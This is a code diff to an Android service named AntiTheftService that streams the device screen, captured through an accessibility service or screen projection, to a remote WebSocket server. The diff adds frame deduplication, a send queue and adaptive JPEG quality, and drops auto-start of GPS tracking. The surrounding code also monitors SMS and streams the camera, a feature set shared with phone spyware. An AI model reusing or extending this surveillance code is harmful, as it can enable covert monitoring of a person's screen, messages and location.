@@ -178,6 +178,16 @@ class AntiTheftService : LifecycleService() {
     private var isScreenStreaming = false
     private var lastFrameTime = 0L
 
+    // Screen stream send queue (single-frame buffer drops unsent frames automatically)
+    private var screenSendSlot: ByteArray? = null
+    @Volatile
+    private var screenSendFlushScheduled = false
+    private var screenSendThread: HandlerThread? = null
+    private var screenSendHandler: Handler? = null
+    private var lastFrameHash = 0L
+    private var screenJpegQuality = 45
+    private var screenJitterFrames = 0
+
     // SMS monitoring
     private var smsObserver: ContentObserver? = null
     private var lastKnownSmsId = 0L
@@ -466,12 +476,10 @@ class AntiTheftService : LifecycleService() {
                 stableHandler.postDelayed(stableRunnable, 30_000L)
 
                 sendTelemetry()
-                // Auto-start location tracking immediately on connect
                 Handler(Looper.getMainLooper()).post {
-                    startLocationTracking()
                     registerSmsObserver()
                 }
-                sendConsoleLog("Aparelho conectado ao servidor. Rastreamento GPS iniciado automaticamente.")
+                sendConsoleLog("Aparelho conectado ao servidor.")
             }
 
             override fun onMessage(webSocket: WebSocket, text: String) {
@@ -851,15 +859,21 @@ class AntiTheftService : LifecycleService() {
     @android.annotation.TargetApi(Build.VERSION_CODES.R)
     private fun startScreenStreamingViaAccessibility() {
         isScreenStreaming = true
-        sendConsoleLog("Transmissão de tela via Acessibilidade iniciada (permanente).")
+        startScreenSender()
+        sendConsoleLog("Transmissão de tela via Acessibilidade iniciada.")
 
-        val handler = Handler(Looper.getMainLooper())
+        val captureThread = HandlerThread("ScreenCaptureThread").apply { start() }
+        val captureHandler = Handler(captureThread.looper)
         val runnable = object : Runnable {
             override fun run() {
-                if (!isScreenStreaming) return
+                if (!isScreenStreaming) {
+                    captureThread.quitSafely()
+                    return
+                }
                 val svc = ProtectAccessibilityService.instance
                 if (svc == null) {
                     isScreenStreaming = false
+                    captureThread.quitSafely()
                     sendConsoleLog("Serviço de acessibilidade inativo — transmissão encerrada.")
                     return
                 }
@@ -868,22 +882,27 @@ class AntiTheftService : LifecycleService() {
                         try {
                             val w = 360; val h = 640
                             val scaled = Bitmap.createScaledBitmap(bitmap, w, h, false)
-                            val out = java.io.ByteArrayOutputStream()
-                            scaled.compress(Bitmap.CompressFormat.JPEG, 45, out)
+                            val hash = computeFrameHash(scaled)
+                            val skipFrame = lastFrameHash != 0L && hash == lastFrameHash
+                            if (!skipFrame) {
+                                lastFrameHash = hash
+                                val out = java.io.ByteArrayOutputStream()
+                                scaled.compress(Bitmap.CompressFormat.JPEG, screenJpegQuality, out)
+                                queueScreenFrame(out.toByteArray(), 0x01.toByte())
+                            }
                             if (scaled !== bitmap) scaled.recycle()
                             bitmap.recycle()
-                            sendTypedBinary(0x01.toByte(), out.toByteArray())
                         } catch (e: Exception) {
                             bitmap.recycle()
                         }
                     }
-                    if (isScreenStreaming) handler.postDelayed(this, 150)
+                    if (isScreenStreaming) captureHandler.postDelayed(this, 200)
                 }
             }
         }
-        accessibilityFrameHandler = handler
+        accessibilityFrameHandler = captureHandler
         accessibilityFrameRunnable = runnable
-        handler.post(runnable)
+        captureHandler.post(runnable)
     }
 
     private fun startScreenStreamingViaMediaProjection() {
@@ -913,6 +932,7 @@ class AntiTheftService : LifecycleService() {
             }
             
             isScreenStreaming = true
+            startScreenSender()
             sendConsoleLog("Transmissão de tela aceita pelo usuário. Iniciando captura de frames...")
 
             // Setup display parameters
@@ -940,7 +960,6 @@ class AntiTheftService : LifecycleService() {
             imageReader!!.setOnImageAvailableListener({ reader ->
                 try {
                     val now = System.currentTimeMillis()
-                    // Cap frame rate at ~6 FPS (at least 150ms between frames) to optimize CPU/socket
                     if (now - lastFrameTime < 150) {
                         val image = reader.acquireLatestImage()
                         image?.close()
@@ -964,23 +983,33 @@ class AntiTheftService : LifecycleService() {
                     bitmap.copyPixelsFromBuffer(buffer)
                     image.close()
                     
-                    // Slice padding if present
                     val cleanBitmap = if (rowPadding > 0) {
                         Bitmap.createBitmap(bitmap, 0, 0, width, height)
                     } else {
                         bitmap
                     }
+
+                    // Scene-change detection: skip if screen hasn't changed
+                    if (lastFrameHash != 0L) {
+                        val hash = computeFrameHash(cleanBitmap)
+                        if (hash == lastFrameHash) {
+                            if (cleanBitmap != bitmap) cleanBitmap.recycle()
+                            bitmap.recycle()
+                            return@setOnImageAvailableListener
+                        }
+                        lastFrameHash = hash
+                    } else {
+                        lastFrameHash = computeFrameHash(cleanBitmap)
+                    }
                     
-                    // Compress to JPEG
                     val outStream = ByteArrayOutputStream()
-                    cleanBitmap.compress(Bitmap.CompressFormat.JPEG, 45, outStream)
+                    cleanBitmap.compress(Bitmap.CompressFormat.JPEG, screenJpegQuality, outStream)
                     val jpegBytes = outStream.toByteArray()
 
                     if (cleanBitmap != bitmap) cleanBitmap.recycle()
                     bitmap.recycle()
 
-                    // 0x01 = screen frame type prefix
-                    sendTypedBinary(0x01.toByte(), jpegBytes)
+                    queueScreenFrame(jpegBytes, 0x01.toByte())
                     
                 } catch (e: Exception) {
                     Log.e("AntiTheftService", "Error processing screen frame: ${e.message}")
@@ -1022,6 +1051,17 @@ class AntiTheftService : LifecycleService() {
         } catch (e: Exception) {
             Log.e("AntiTheftService", "Failed to clean up screen stream: ${e.message}")
         }
+
+        // Stop screen sender thread
+        screenSendHandler?.removeCallbacksAndMessages(null)
+        screenSendThread?.quitSafely()
+        screenSendThread = null
+        screenSendHandler = null
+        screenSendSlot = null
+        screenSendFlushScheduled = false
+        screenJitterFrames = 0
+        screenJpegQuality = 45
+        lastFrameHash = 0L
 
         sendConsoleLog("Transmissão de tela finalizada.")
     }
@@ -1142,6 +1182,60 @@ class AntiTheftService : LifecycleService() {
         } catch (e: Exception) {
             // Socket closed mid-stream — ignore; next frame uses the reconnected socket.
         }
+    }
+
+    // ── Screen stream send queue (drops old unsent frames) ─────────────────────
+    private fun startScreenSender() {
+        if (screenSendThread != null) return
+        screenSendThread = HandlerThread("ScreenSendThread").apply { start() }
+        screenSendHandler = Handler(screenSendThread!!.looper)
+    }
+
+    private fun queueScreenFrame(payload: ByteArray, type: Byte) {
+        if (screenSendHandler == null) return
+        val packet = ByteArray(1 + payload.size)
+        packet[0] = type
+        System.arraycopy(payload, 0, packet, 1, payload.size)
+        // Adaptive quality: if slot was occupied (frame dropped), reduce quality
+        val prev = screenSendSlot
+        screenSendSlot = packet
+        if (prev != null) {
+            screenJitterFrames++
+            if (screenJitterFrames > 5) {
+                screenJpegQuality = maxOf(15, screenJpegQuality - 5)
+                screenJitterFrames = 0
+            }
+        } else {
+            screenJitterFrames = maxOf(0, screenJitterFrames - 1)
+            if (screenJitterFrames == 0 && screenJpegQuality < 45) {
+                screenJpegQuality = minOf(45, screenJpegQuality + 2)
+            }
+        }
+        if (!screenSendFlushScheduled) {
+            screenSendFlushScheduled = true
+            screenSendHandler?.post {
+                screenSendFlushScheduled = false
+                val p = screenSendSlot ?: return@post
+                screenSendSlot = null
+                try {
+                    webSocket?.send(p.toByteString())
+                } catch (e: Exception) { }
+            }
+        }
+    }
+
+    // ── Simple perceptual hash for scene-change detection ──────────────────────
+    private fun computeFrameHash(bitmap: Bitmap): Long {
+        val scaled = Bitmap.createScaledBitmap(bitmap, 8, 8, true)
+        val pixels = IntArray(64)
+        scaled.getPixels(pixels, 0, 8, 0, 0, 8, 8)
+        scaled.recycle()
+        var hash = 0L
+        for (i in 0 until 64) {
+            hash = hash xor ((pixels[i].toLong() and 0xFFFFFFFFL) shl (i % 56))
+            hash = (hash shl 1) or (hash ushr 63)
+        }
+        return hash
     }
 
     // ── Live Camera Stream (CameraX ImageAnalysis) ─────────────────────────────
